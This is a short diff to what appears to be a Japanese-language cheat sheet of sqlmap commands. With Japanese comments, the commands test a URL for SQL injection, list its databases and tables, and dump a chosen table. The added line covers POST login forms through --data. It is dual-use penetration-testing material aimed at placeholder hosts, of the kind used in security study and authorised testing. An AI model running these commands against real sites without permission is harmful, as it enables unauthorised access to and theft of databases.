@@ -67,3 +67,4 @@ sqlmap -u "http://www.example.com/example.php?search=admin" #脆弱性がある�
 sqlmap -u "http://www.example.com/example.php?search=admin" --dbs #データベースの列挙
 sqlmap -u "http://www.example.com/example.php?search=admin" -D <DB_name> --tables #指定したデータベースのテーブルを列挙
 sqlmap -u "http://www.example.com/example.php?search=admin" -D <DB_name> -T <table_name> --dump #特定したテーブルを指定してダンプ
+sqlmap -u "http://example.com/login.php" --data "username=admin&password=*" --dbs #postメソッドの場合は--dataで指定する
